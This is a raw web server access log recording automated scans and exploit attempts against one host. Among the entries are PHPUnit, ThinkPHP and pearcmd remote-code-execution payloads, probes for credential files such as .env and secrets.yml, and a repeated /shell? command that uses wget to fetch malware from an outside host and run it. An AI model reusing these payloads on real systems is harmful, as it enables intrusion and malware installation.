130.61.239.85 - - [15/Jan/2025:01:17:38 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:39 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:41 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:42 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:44 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:45 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:47 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:48 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:50 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:51 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:53 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:55 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:56 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:57 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:58 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:17:59 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:18:01 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:18:02 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:18:03 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:18:05 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
130.61.239.85 - - [15/Jan/2025:01:18:06 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
112.163.202.160 - - [15/Jan/2025:01:23:12 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
64.23.201.216 - - [15/Jan/2025:01:24:19 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
103.119.166.175 - - [15/Jan/2025:01:41:26 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:01:44:09 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
192.155.90.220 - - [15/Jan/2025:01:46:00 +0000] "\x16\x03\x01" 400 531 "-" "-"
45.79.172.21 - - [15/Jan/2025:01:46:16 +0000] "\x16\x03\x01" 400 531 "-" "-"
66.249.64.110 - - [15/Jan/2025:01:54:11 +0000] "GET /robots.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.108 - - [15/Jan/2025:01:54:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.110 - - [15/Jan/2025:01:54:12 +0000] "GET /wp-content/uploads/2016/08/img__0000_016215-0286_5.jpg HTTP/1.1" 302 386 "-" "Googlebot-Image/1.0"
66.249.64.109 - - [15/Jan/2025:01:54:13 +0000] "GET / HTTP/1.1" 200 945 "-" "Googlebot-Image/1.0"
179.43.191.146 - - [15/Jan/2025:02:20:33 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
65.49.1.117 - - [15/Jan/2025:02:23:16 +0000] "\x16\x03\x01" 400 531 "-" "-"
134.122.71.104 - - [15/Jan/2025:02:29:09 +0000] "GET / HTTP/1.1" 400 531 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
87.120.120.18 - - [15/Jan/2025:02:30:18 +0000] "GET /.env HTTP/1.1" 302 350 "-" "BlackBerry8320/4.2.2 Profile/MIDP-2.0 Configuration/CLDC-1.1 VendorID/100"
78.153.140.149 - - [15/Jan/2025:02:37:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:02:37:54 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [15/Jan/2025:02:43:15 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [15/Jan/2025:02:55:34 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [15/Jan/2025:02:55:35 +0000] "GET / HTTP/1.1" 200 966 "http://34.87.62.22:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
162.216.149.94 - - [15/Jan/2025:03:08:07 +0000] "GET / HTTP/1.1" 200 947 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
5.181.190.248 - - [15/Jan/2025:03:09:30 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=read HTTP/1.1" 302 331 "-" "-"
5.181.190.248 - - [15/Jan/2025:03:09:31 +0000] "GET / HTTP/1.1" 200 1742 "http://34.87.62.22:80/cgi-bin/luci/;stok=/locale?form=country&operation=read" "-"
92.255.57.58 - - [15/Jan/2025:03:26:17 +0000] "\x16\x03\x01\x05\xa8\x01" 400 531 "-" "-"
78.153.140.149 - - [15/Jan/2025:04:00:28 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:04:00:28 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
80.82.77.202 - - [15/Jan/2025:04:03:48 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.11) Gecko/2009060309 Ubuntu/9.10 (karmic) Firefox/3.0.11"
95.214.55.226 - - [15/Jan/2025:04:14:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.149 - - [15/Jan/2025:04:40:34 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:04:40:35 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
66.249.64.109 - - [15/Jan/2025:04:53:11 +0000] "GET /robots.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.109 - - [15/Jan/2025:04:53:12 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.110 - - [15/Jan/2025:04:53:12 +0000] "GET /wp-content/uploads/2016/08/img__0003_016215-0286_1.jpg HTTP/1.1" 302 387 "-" "Googlebot-Image/1.0"
66.249.64.110 - - [15/Jan/2025:04:53:13 +0000] "GET / HTTP/1.1" 200 944 "-" "Googlebot-Image/1.0"
115.86.3.78 - - [15/Jan/2025:05:10:22 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
141.98.11.119 - - [15/Jan/2025:05:11:39 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
175.208.122.56 - - [15/Jan/2025:05:17:19 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
141.98.11.119 - - [15/Jan/2025:05:38:16 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
78.153.140.149 - - [15/Jan/2025:06:05:57 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.149 - - [15/Jan/2025:06:05:58 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
51.8.223.96 - - [15/Jan/2025:06:14:08 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
178.215.236.132 - - [15/Jan/2025:06:17:26 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36 OPR/47.0.2631.55"
159.223.205.208 - - [15/Jan/2025:06:20:43 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; FreeBSD amd64) AppleWebKit/536.5 (KHTML like Gecko) Chrome/19.0.1084.56 Safari/536.5"
66.249.64.108 - - [15/Jan/2025:06:23:11 +0000] "GET /robots.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.108 - - [15/Jan/2025:06:23:12 +0000] "GET / HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.108 - - [15/Jan/2025:06:23:12 +0000] "GET /wp-content/uploads/2016/08/img__0001_016215-0286_3.jpg HTTP/1.1" 302 386 "-" "Googlebot-Image/1.0"
66.249.64.108 - - [15/Jan/2025:06:23:13 +0000] "GET / HTTP/1.1" 200 944 "-" "Googlebot-Image/1.0"
31.220.1.144 - - [15/Jan/2025:06:32:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
31.13.224.222 - - [15/Jan/2025:06:41:01 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 9; SM-N960F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
141.98.11.119 - - [15/Jan/2025:06:44:42 +0000] "GET /shell?killall+-9+arm7;killall+-9+arm4;killall+-9+arm;killall+-9+/bin/sh;killall+-9+/bin/sh;killall+-9+/z/bin;killall+-9+/bin/bash;cd+/tmp;rm+vevhea4+ivwebcda7;wget+http:/\\/dihvbe.theeyefirewall.su/ivwebcda7;chmod+777+ivwebcda7;./ivwebcda7+jaws;wget+http:/\\/dihvbe.theeyefirewall.su/vevhea4;chmod+777+vevhea4;./vevhea4+jaws HTTP/1.1" 302 387 "-" "KrebsOnSecurity"
157.66.55.50 - - [15/Jan/2025:07:07:36 +0000] "GET /.git/config HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
157.66.55.50 - - [15/Jan/2025:07:07:37 +0000] "GET / HTTP/1.1" 200 889 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
64.23.201.216 - - [15/Jan/2025:07:07:59 +0000] "GET /admin/assets/js/views/login.js HTTP/1.0" 302 350 "-" "xfa1"
45.79.181.223 - - [15/Jan/2025:07:50:03 +0000] "\x16\x03\x01" 400 531 "-" "-"
66.249.64.108 - - [15/Jan/2025:07:53:11 +0000] "GET /robots.txt HTTP/1.1" 302 387 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.109 - - [15/Jan/2025:07:53:12 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.109 - - [15/Jan/2025:07:53:12 +0000] "GET /wp-content/uploads/2016/08/img__0000_131998-7774_8.jpg HTTP/1.1" 302 386 "-" "Googlebot-Image/1.0"
66.249.64.109 - - [15/Jan/2025:07:53:13 +0000] "GET / HTTP/1.1" 200 944 "-" "Googlebot-Image/1.0"
78.153.140.224 - - [15/Jan/2025:07:59:04 +0000] "\x16\x03\x01" 400 531 "-" "-"
78.153.140.224 - - [15/Jan/2025:07:59:04 +0000] "GET /.env HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 5.0; WOW64; rv:6.0) Gecko/20100101 Firefox/6.0"
78.153.140.224 - - [15/Jan/2025:07:59:04 +0000] "GET /.production HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 5.1; rv:8.0.1) Gecko/20100101 Firefox/8.0.1"
78.153.140.224 - - [15/Jan/2025:07:59:05 +0000] "GET /.env.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 7.0; LGMP450 Build/NRD90U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.83 Mobile Safari/537.36"
78.153.140.224 - - [15/Jan/2025:07:59:05 +0000] "GET /env.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 5.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.87 Safari/537.36"
78.153.140.224 - - [15/Jan/2025:07:59:06 +0000] "GET /.txt HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.51.22 (KHTML, like Gecko) Version/5.1.1 Safari/534.51.22"
78.153.140.224 - - [15/Jan/2025:07:59:06 +0000] "GET /env. HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
78.153.140.224 - - [15/Jan/2025:07:59:07 +0000] "GET /.env. HTTP/1.1" 302 331 "-" "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009033100 Ubuntu/9.04 (jaunty) Firefox/3.0.8"
78.153.140.224 - - [15/Jan/2025:07:59:07 +0000] "GET /p-info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.1; de; rv:1.9.2.8) Gecko/20100722 Firefox 3.6.8"
78.153.140.224 - - [15/Jan/2025:07:59:07 +0000] "GET /p.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; U; Android 4.2; en-us; sdk Build/MR1) AppleWebKit/535.19 (KHTML, like Gecko) Version/4.2 Safari/535.19"
78.153.140.224 - - [15/Jan/2025:07:59:08 +0000] "GET /p_info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.4.2; LGMS323 Build/KOT49I.MS32310b) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.59 Mobile Safari/537.36"
78.153.140.224 - - [15/Jan/2025:07:59:08 +0000] "GET /php.php HTTP/1.1" 302 331 "-" "Opera/9.80 (S60; SymbOS; Opera Mobi/35779; U; hu) Presto/2.10.254 Version/12.00"
78.153.140.224 - - [15/Jan/2025:07:59:09 +0000] "GET /php_info.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.76 Safari/537.36 OPR/16.0.1196.80"
78.153.140.224 - - [15/Jan/2025:07:59:09 +0000] "GET /secrets.yml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.517"
78.153.140.224 - - [15/Jan/2025:07:59:10 +0000] "GET /php-details.php HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1;)"
78.153.140.224 - - [15/Jan/2025:07:59:10 +0000] "GET /php-info.php HTTP/1.1" 302 331 "-" "Opera/9.80 (Windows NT 6.1; U; Edition DriverPack; en) Presto/2.10.229 Version/11.61"
78.153.140.224 - - [15/Jan/2025:07:59:12 +0000] "GET /php_details.php HTTP/1.1" 302 331 "-" "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36"
78.153.140.224 - - [15/Jan/2025:07:59:12 +0000] "GET /phpdetails.php HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1)"
78.153.140.224 - - [15/Jan/2025:07:59:12 +0000] "GET /.secret HTTP/1.1" 302 331 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Tablet PC 2.0; .NET4.0C; .NET4.0E; EIE10;ENUSWOL)"
78.153.140.224 - - [15/Jan/2025:07:59:13 +0000] "GET /.secrets HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPad; CPU OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G35 Safari/601.1"
